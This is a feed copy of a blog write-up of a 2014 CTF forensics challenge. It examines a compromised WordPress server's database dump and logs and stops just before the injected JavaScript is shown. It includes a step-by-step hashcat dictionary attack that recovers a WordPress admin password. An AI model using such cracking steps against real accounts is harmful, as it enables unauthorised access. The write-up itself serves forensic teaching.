<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom"><title>chmod +x singularity.sh - Forensics</title><link href="http://bt3gl.github.io/" rel="alternate"></link><link href="http://bt3gl.github.io/feeds/forensics.atom.xml" rel="self"></link><id>http://bt3gl.github.io/</id><updated>2014-09-28T11:21:00-04:00</updated><entry><title>CSAW CTF 2014 - Forensics 300: "Fluffy No More"</title><link href="http://bt3gl.github.io/csaw-ctf-2014-forensics-300-fluffy-no-more.html" rel="alternate"></link><published>2014-09-28T11:21:00-04:00</published><updated>2014-09-28T11:21:00-04:00</updated><author><name>Marina von Steinkirch</name></author><id>tag:bt3gl.github.io,2014-09-28:/csaw-ctf-2014-forensics-300-fluffy-no-more.html</id><summary type="html">&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
&lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies …&lt;/p&gt;&lt;/blockquote&gt;</summary><content type="html">&lt;p&gt;This is the fourth and the last of the forensics challenge in the CSAW CTF 2014 competition. It was much harder than the three before, but it was also much more interesting.&lt;/p&gt;
&lt;p&gt;The challenge starts with the following text:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;OH NO WE'VE BEEN HACKED!!!!!! -- said the Eye Heart Fluffy Bunnies Blog owner.
Life was grand for the fluff fanatic until one day the site's users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious "Forgotten Freaks" hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??&lt;/p&gt;
&lt;p&gt;Well... The fluff needs your stuff. I've pulled the logs from the server for you along with a backup of it's database and configuration. Figure out what is going on!&lt;/p&gt;
&lt;p&gt;Written by brad_anton&lt;/p&gt;
&lt;p&gt;&lt;a href="https://ctf.isis.poly.edu/static/uploads/649bdf6804782af35cb9086512ca5e0d/CSAW2014-FluffyNoMore-v0.1.tar.bz2"&gt;CSAW2014-FluffyNoMore-v0.1.tar.bz2&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Oh, no! Nobody should mess with fluffy bunnies! Ever! Let's find how this attack happened!&lt;/p&gt;
&lt;h2&gt;Inspecting the Directories&lt;/h2&gt;
&lt;p&gt;We start by checking the identity of the file with the command &lt;a href="http://en.wikipedia.org/wiki/File_(command)"&gt;file&lt;/a&gt;. We do this to make sure that the extension is not misleading:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ file CSAW2014-FluffyNoMore-v0.1.tar.bz2
CSAW2014-FluffyNoMore-v0.1.tar.bz2: bzip2 compressed data, block &lt;span class="nv"&gt;size&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 900k
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;OK, cool, we can go ahead and unzip the &lt;em&gt;bzip2&lt;/em&gt; (compressed) tarball:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tar --help &lt;span class="p"&gt;|&lt;/span&gt; grep bz
  -j, --bzip2                filter the archive through bzip2
$ tar -xjf CSAW2014-FluffyNoMore-v0.1.tar.bz2
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now let's take a look inside the folder:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ tree CSAW2014-FluffyNoMore-v0.1
CSAW2014-FluffyNoMore-v0.1
├── etc_directory.tar.bz2
├── logs.tar.bz2
├── mysql_backup.sql.bz2
└── webroot.tar.bz2

&lt;span class="m"&gt;0&lt;/span&gt; directories, &lt;span class="m"&gt;4&lt;/span&gt; files
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;All right, 4 more tarballs. Unziping and organizing them give us the following directories:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;- etc/
- var/log and var/www
- mysql_backup.sql ([MySQL database dump file])
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This is the directory structure of a  &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;, where LAMP stands for Linux-Apache-MySQL-PHP in the &lt;a href="http://www.tldp.org/LDP/intro-linux/html/sect_03_01.html"&gt;Linux File System&lt;/a&gt;. In this framework, the PHP/HTML/JavaScript webpage is placed inside &lt;code&gt;var/www&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The directory &lt;code&gt;var/&lt;/code&gt; contains files that are expected to change in size and content as the system is running (var stands for variable). So it is natural that system log files are generally placed at &lt;code&gt;/var/log&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Finally, the &lt;code&gt;etc/&lt;/code&gt; directory contains the system configuration files. For example, the file &lt;code&gt;resolv.conf&lt;/code&gt; tells the system where to go on the network to obtain host name to IP address mappings (DNS). Another example is the file  &lt;code&gt;passwd&lt;/code&gt;, which stores login information.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Before Anything else...&lt;/h2&gt;
&lt;p&gt;OK, based on the previous challenges, we need to give a try:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ grep -r -l &lt;span class="s2"&gt;&amp;quot;key{&amp;quot;&lt;/span&gt;
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css

$ grep -r -l &lt;span class="s2"&gt;&amp;quot;flag{&amp;quot;&lt;/span&gt;
var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
webroot.tar.bz2-extracted/var/www/html/wp-content/plugins/contact-form-7/includes/js/jquery-ui/themes/smoothness/jquery-ui.min.css
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Is our life this easy??? No, of course not. The hits we got are just funny names to mislead us, for example:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; -96px}.ui-icon-home{background-position:0 -112px}.ui-icon-flag{background-position:-16px
&lt;/pre&gt;&lt;/div&gt;


&lt;hr&gt;
&lt;h2&gt;Analyzing the MySQL Dump File&lt;/h2&gt;
&lt;p&gt;Let's start taking a look at &lt;code&gt;mysql_backup.sql&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Of course, no luck for:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat mysql_backup.sql &lt;span class="p"&gt;|&lt;/span&gt; grep &lt;span class="s1"&gt;&amp;#39;flag{&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Fine. We open &lt;code&gt;mysql_backup.sql&lt;/code&gt; in a text editor. The comments table shows that someone named "hacker" made an appearance:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;-- MySQL dump 10.13  Distrib 5.5.38, for debian-linux-gnu (i686)&lt;/span&gt;
&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;span class="c1"&gt;-- Host: localhost    Database: wordpress&lt;/span&gt;
&lt;span class="c1"&gt;-- ------------------------------------------------------&lt;/span&gt;

&lt;span class="c1"&gt;-- Dumping data for table `wp_comments`&lt;/span&gt;
&lt;span class="c1"&gt;--&lt;/span&gt;
&lt;span class="c1"&gt;(..)&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Hacker&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hacker@secretspace.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.130&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 14:21:26&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 14:21:26&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I HATE BUNNIES AND IM GOING TO HACK THIS SITE BWHAHAHAHAHAHAHAHAHAHAHAH!!!!!!! BUNNIES SUX&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Bald Bunny&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;nohair@hairlessclub.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.130&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 20:47:18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-16 20:47:18&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;I find this blog EXTREMELY OFFENSIVE!&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;

&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;8&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;5&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;MASTER OF DISASTER&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;shh@nottellin.com&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;192.168.127.137&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-17 19:40:57&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;2014-09-17 19:40:57&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Shut up baldy&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; rv:11.0) like Gecko&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;7&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;(...)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Searching for the host &lt;strong&gt;secretspace.com&lt;/strong&gt; leads to some generic website. Inspecting its source code does not give us any hint either. Maybe its IP address?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ dig secretspace.com

&lt;span class="p"&gt;;&lt;/span&gt; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG &lt;span class="m"&gt;9&lt;/span&gt;.9.4-P2-RedHat-9.9.4-15.P2.fc20 &amp;lt;&amp;lt;&amp;gt;&amp;gt; secretspace.com
&lt;span class="p"&gt;;;&lt;/span&gt; global options: +cmd
&lt;span class="p"&gt;;;&lt;/span&gt; Got answer:
&lt;span class="p"&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class="s"&gt;&amp;lt;&amp;lt;- opco&lt;/span&gt;de: QUERY, status: NOERROR, id: &lt;span class="m"&gt;61131&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; flags: qr rd ra ad&lt;span class="p"&gt;;&lt;/span&gt; QUERY: &lt;span class="m"&gt;1&lt;/span&gt;, ANSWER: &lt;span class="m"&gt;1&lt;/span&gt;, AUTHORITY: &lt;span class="m"&gt;0&lt;/span&gt;, ADDITIONAL: &lt;span class="m"&gt;0&lt;/span&gt;

&lt;span class="p"&gt;;;&lt;/span&gt; QUESTION SECTION:
&lt;span class="p"&gt;;&lt;/span&gt;secretspace.com.       IN  A

&lt;span class="p"&gt;;;&lt;/span&gt; ANSWER SECTION:
secretspace.com.    &lt;span class="m"&gt;285&lt;/span&gt; IN  A   &lt;span class="m"&gt;72&lt;/span&gt;.167.232.29

&lt;span class="p"&gt;;;&lt;/span&gt; Query time: &lt;span class="m"&gt;7&lt;/span&gt; msec
&lt;span class="p"&gt;;;&lt;/span&gt; SERVER: &lt;span class="m"&gt;10&lt;/span&gt;.0.0.1#53&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="m"&gt;10&lt;/span&gt;.0.0.1&lt;span class="o"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; WHEN: Thu Sep &lt;span class="m"&gt;25&lt;/span&gt; &lt;span class="m"&gt;15&lt;/span&gt;:51:26 EDT &lt;span class="m"&gt;2014&lt;/span&gt;
&lt;span class="p"&gt;;;&lt;/span&gt; MSG SIZE  rcvd: &lt;span class="m"&gt;49&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The IP 72.167.232.29  leads to another generic page with no hints and with nothing in special in the source code. Wrong direction...&lt;/p&gt;
&lt;p&gt;All right, let's give a last try and open the tables from the MySQL dump file inside a nice GUI. I use &lt;a href="http://www.phpmyadmin.net/home_page/index.php"&gt;phpMyAdmin&lt;/a&gt;, which I showed how to install and to configure in my tutorial about setting up a &lt;a href="https://coderwall.com/p/syyk0g?i=5&amp;amp;p=1&amp;amp;q=author%3Abt3gl&amp;amp;t%5B%5D=bt3gl"&gt;LAMP server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We open &lt;code&gt;localhost/phpmyadmin&lt;/code&gt; in our browser. First we go  to &lt;em&gt;Databases&lt;/em&gt; and then &lt;em&gt;Create Database&lt;/em&gt; with any name we want. Then we  &lt;em&gt;Import&lt;/em&gt; &lt;code&gt;`mysql_backup.sql&lt;/code&gt; to this database. All the tables are loaded. Let's use the &lt;em&gt;Search&lt;/em&gt; option to look for &lt;em&gt;key&lt;/em&gt; or &lt;em&gt;flag&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="http://i.imgur.com/tVOY1VJ.png"&gt;
&lt;img alt="" src="http://i.imgur.com/jY7CbLZ.png"&gt;&lt;/p&gt;
&lt;p&gt;Nope. Nothing in special. By the way, &lt;code&gt;`default_pingback_flag1&lt;/code&gt; is just a &lt;strong&gt;Wordpress&lt;/strong&gt; flag indicating the default status of ping backs when new blog posts are published.&lt;/p&gt;
&lt;p&gt;Let's continue our search. If we look  inside each of the tables we find:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;The URL for the &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com"&gt;blog&lt;/a&gt;, which doesn't render. However, in the source code there is a commented link that leads to a &lt;a href="http://ww17.blog.eyeheartfluffybunnies.com/?fp=Tnxj5vWdcChO2G66EhCHHqSAdskqgQmZEbVQIh1DCmrgCyQjbeNsPhkvCpIUcP19mwOmcCS1hIeFb9Aj3%2FP4fw%3D%3D&amp;amp;prvtof=RyfmkPY5YuWnUulUghSjPRX510XSb9C0HJ2xsUn%2Fd3Q%3D&amp;amp;poru=jcHIwHNMXYtWvhsucEK%2BtSMzUepfq46Tam%2BwGZBSFMjZiV2p3eqdw8zpPiLr76ixCoirz%2FR955vowRxEMBO%2FoQ%3D%3D&amp;amp;cifr=1&amp;amp;%22"&gt;cute website&lt;/a&gt;. Nothing else.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Oh, wait! We found a hashed password!
&lt;img alt="" src="http://i.imgur.com/FiQONze.png"&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2&gt;Cracking the Password&lt;/h2&gt;
&lt;p&gt;We want to crack &lt;code&gt;$P$BmHbpWPZrjt.2V8T2xDJfbDrAJZ9So1&lt;/code&gt; and for this we are going to use &lt;a href="http://hashcat.net/hashcat/"&gt;hashcat&lt;/a&gt;. If you are in &lt;a href="http://www.kali.org/"&gt;Kali&lt;/a&gt; or in any Debian distribution you can install it with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ apt-get hashcat
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;In Fedora, we need to download and unzip it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://hashcat.net/files/hashcat-0.47.7z
$ 7za e hashcat-0.47.7z
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now, we are going to perform a brute force attack so we need a list of passwords. If you are using Kali, you can find them with:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ locate wordlist
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;If not, this is an example for you (it's always good to have several lists!):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ wget http://www.scovetta.com/download/500_passwords.txt
$ head 500_passwords.txt
&lt;span class="m"&gt;123456&lt;/span&gt;
password
&lt;span class="m"&gt;12345678&lt;/span&gt;
&lt;span class="m"&gt;1234&lt;/span&gt;
&lt;span class="m"&gt;12345&lt;/span&gt;
dragon
qwerty
&lt;span class="m"&gt;696969&lt;/span&gt;
mustang
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Hashcat is awesome because it gives you a list of hash types:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;    0 = MD5
   10 = md5($pass.$salt)
   20 = md5($salt.$pass)
   30 = md5(unicode($pass).$salt)
   40 = md5(unicode($pass).$salt)
   50 = HMAC-MD5 (key = $pass)
   60 = HMAC-MD5 (key = $salt)
  100 = SHA1
  110 = sha1($pass.$salt)
  120 = sha1($salt.$pass)
  130 = sha1(unicode($pass).$salt)
  140 = sha1($salt.unicode($pass))
  150 = HMAC-SHA1 (key = $pass)
  160 = HMAC-SHA1 (key = $salt)
  200 = MySQL
  300 = MySQL4.1/MySQL5
  400 = phpass, MD5(Wordpress), MD5(phpBB3)
  500 = md5crypt, MD5(Unix), FreeBSD MD5, Cisco-IOS MD5
  800 = SHA-1(Django)
  (...)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We choose 400 because we are dealing with Wordpress. We copy and paste the hash to a file &lt;em&gt;pass.hash&lt;/em&gt;. Then, we run:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ ./hashcat-cli64.bin -m &lt;span class="m"&gt;400&lt;/span&gt; -a &lt;span class="m"&gt;0&lt;/span&gt; -o cracked.txt --remove  pass.hash word_list.txt

Initializing hashcat v0.47 by atom with &lt;span class="m"&gt;8&lt;/span&gt; threads and 32mb segment-size...
&lt;span class="o"&gt;(&lt;/span&gt;...&lt;span class="o"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;where:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-m is for --hash-type=NUM&lt;/li&gt;
&lt;li&gt;-a 0: Using a dictionary attack&lt;/li&gt;
&lt;li&gt;cracked.txt is the output file&lt;/li&gt;
&lt;li&gt;word_list.txt is our dictionary&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Now let's take a peak in the output file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ cat cracked.txt
&lt;span class="nv"&gt;$P$BmHbpWPZrjt&lt;/span&gt;.2V8T2xDJfbDrAJZ9So1:fluffybunnies
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It worked! Our password is &lt;strong&gt;fluffybunnies&lt;/strong&gt;!&lt;/p&gt;
&lt;p&gt;All right, this is a very silly password! It could be easily guessed. If you were the attacker, wouldn't you try this as the first option? OK, maybe right after &lt;em&gt;password&lt;/em&gt; and &lt;em&gt;123456&lt;/em&gt;... :)&lt;/p&gt;
&lt;h4&gt;What we have so far&lt;/h4&gt;
&lt;p&gt;All we have learned from the MySQL dump file was:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;the attacker's motivation,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;the blog's URL,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;that the application was in Wordpress,&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;and a password.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ah,  also that &lt;code&gt;mailserver_login:login@example.com&lt;/code&gt; and &lt;code&gt;mailserver_pass=password&lt;/code&gt;. Talking about security...&lt;/p&gt;
&lt;p&gt;Let's move on.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Inspecting /var/logs/apache2&lt;/h2&gt;
&lt;p&gt;The next item in the list is log inspection. We need wisely choose where to start because there are many of them:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ find . -type f  -name &lt;span class="s1"&gt;&amp;#39;*.log&amp;#39;&lt;/span&gt;
./apache2/error.log
./apache2/access.log
./apache2/other_vhosts_access.log
./fontconfig.log
./boot.log
./gpu-manager.log
./mysql.log
./bootstrap.log
./pm-powersave.log
./kern.log
./mysql/error.log
./alternatives.log
./lightdm/x-0.log
./lightdm/lightdm.log
./casper.log
./auth.log
./apt/term.log
./apt/history.log
./dpkg.log
./Xorg.0.log
./upstart/container-detect.log
./upstart/console-setup.log
./upstart/mysql.log
./upstart/alsa-state.log
./upstart/network-manager.log
./upstart/whoopsie.log
./upstart/procps-virtual-filesystems.log
./upstart/cryptdisks.log
./upstart/systemd-logind.log
./upstart/procps-static-network-up.log
./upstart/alsa-restore.log
./upstart/modemmanager.log
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We start with the Apache's log, because they carry the connection information. If there is any important information in the log files, it should appears in the end, because the attack should be one of the last things that were logged.&lt;/p&gt;
&lt;p&gt;It turned out that &lt;a href="http://en.wikipedia.org/wiki/Tail_(Unix)"&gt;Tailing&lt;/a&gt; the &lt;em&gt;apache&lt;/em&gt; logs did not reveal anything useful.&lt;/p&gt;
&lt;hr&gt;
&lt;h2&gt;Inspecting var/logs/auth.log&lt;/h2&gt;
&lt;p&gt;Considering that the password &lt;strong&gt;fluffybunnies&lt;/strong&gt; was very easy to guess, we are going to take a leap and suppose that this was how the attack was crafted.&lt;/p&gt;
&lt;p&gt;Tailing &lt;code&gt;auth.log&lt;/code&gt; shows something interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:18:53 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/bin/chmod -R &lt;span class="m"&gt;775&lt;/span&gt; /var/www/
Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:20:09 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
Sep &lt;span class="m"&gt;17&lt;/span&gt; &lt;span class="m"&gt;19&lt;/span&gt;:20:55 ubuntu sudo:   ubuntu : &lt;span class="nv"&gt;TTY&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;pts/0 &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;PWD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/home/ubuntu/CSAW2014-WordPress/var/www &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;USER&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;root &lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nv"&gt;COMMAND&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;/usr/bin/find /var/www/html/ * touch &lt;span class="o"&gt;{}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So someone logged as root:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;downgraded the permissions of &lt;em&gt;/var/www&lt;/em&gt; (755 means read and execute access for everyone and also write access for the owner of the file), and&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;modified a JavaScript file (html5.js) in &lt;em&gt;vi&lt;/em&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;h2&gt;Finding the JavaScript Exploit&lt;/h2&gt;
&lt;p&gt;It looks like an attack to me! Let's &lt;a href="http://linux.die.net/man/1/diff"&gt;diff&lt;/a&gt; this JavaScript file with the original (&lt;a href="http://phpxref.ftwr.co.uk/wordpress/wp-content/themes/twentythirteen/js/html5.js.source.html"&gt;which we can just google&lt;/a&gt;):&lt;/p&gt;
